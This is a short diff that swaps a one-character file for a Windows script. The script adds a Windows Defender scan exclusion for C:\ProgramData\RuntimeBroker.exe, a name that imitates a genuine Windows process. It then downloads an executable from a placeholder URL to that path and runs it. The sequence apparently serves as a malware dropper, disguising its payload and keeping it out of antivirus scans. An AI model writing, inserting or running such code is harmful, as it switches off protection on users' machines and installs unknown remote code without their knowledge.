@@ -1,1 +1,7 @@
-s
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /f /reg:64
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\RuntimeBroker.exe" /d 0 /f /reg:64
+
+$filePath = "C:\ProgramData\RuntimeBroker.exe"
+$url = "http://url/file/RuntimeBroker.exe" 
+Invoke-WebRequest -Uri $url -OutFile $filePath
+& $filePath
